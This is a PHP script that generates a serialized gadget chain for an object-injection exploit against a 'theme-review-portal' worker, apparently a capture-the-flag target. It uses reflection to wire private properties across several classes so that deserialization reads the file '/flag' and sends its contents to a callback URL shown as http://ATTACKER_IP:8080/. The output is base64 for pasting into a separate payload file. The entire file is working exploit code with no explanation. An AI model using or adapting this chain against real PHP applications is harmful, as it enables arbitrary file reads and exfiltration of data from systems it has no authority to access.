<?php
// Generate the correct PHP serialized gadget chain for the "theme-review-portal"
// worker (uses the real classes.php with private/protected property mangling).
//
// Usage:
//   CLASSES=/path/to/theme-review-portal/worker-php/classes.php \
//   php gen_payload.php http://ATTACKER_IP:8080/
//
// Output: base64(serialize($batch)) -> paste as `phpPayloadBase64` in payload.js.

declare(strict_types=1);

$classes = getenv('CLASSES') ?: (__DIR__ . '/../../theme-review-portal/worker-php/classes.php');
require $classes;

$callback = $argv[1] ?? 'http://127.0.0.1:8080/';

function noctor(string $class): object {
    return (new ReflectionClass($class))->newInstanceWithoutConstructor();
}

function setp(object $obj, string $name, $value): void {
    $p = new ReflectionProperty(get_class($obj), $name);
    $p->setAccessible(true);
    $p->setValue($obj, $value);
}

// LocalAssetStore: reads $root . $prefix . $path
$store = noctor('LocalAssetStore');
setp($store, 'root', '');
setp($store, 'prefix', '');

// AssetCatalog::open($slot) -> stores[$slot] ?? stores[fallback]
$catalog = noctor('AssetCatalog');
setp($catalog, 'stores', ['summary' => $store]);
setp($catalog, 'fallback', 'summary');

// SnapshotView::render() requires meta['variant'] === expected
$view = noctor('SnapshotView');
setp($view, 'catalog', $catalog);
setp($view, 'expected', 'digest');
setp($view, 'slot', 'summary');
setp($view, 'field', 'path');

$layout = noctor('SnippetLayout');
setp($layout, 'view', $view);
setp($layout, 'wrapper', '{{body}}');

$envelope = noctor('PreviewEnvelope');
setp($envelope, 'layout', $layout);
setp($envelope, 'meta', ['variant' => 'digest', 'path' => '/flag', 'slot' => 'summary']);

$relay = noctor('IntegrationRelay');
setp($relay, 'scheme', 'http');

$target = noctor('DeliveryTarget');
setp($target, 'relay', $relay);
setp($target, 'field', 'data');
setp($target, 'expectedChannel', 'summary');

$journal = noctor('DeliveryJournal');
setp($journal, 'target', $target);
setp($journal, 'armed', true);
setp($journal, 'channel', 'summary');

$batch = noctor('PreviewBatch');
setp($batch, 'items', [$envelope]);
setp($batch, 'journal', $journal);
setp($batch, 'profile', ['channel' => 'summary', 'callback' => $callback]);
setp($batch, 'state', 'sealed');

echo base64_encode(serialize($batch)), "\n";
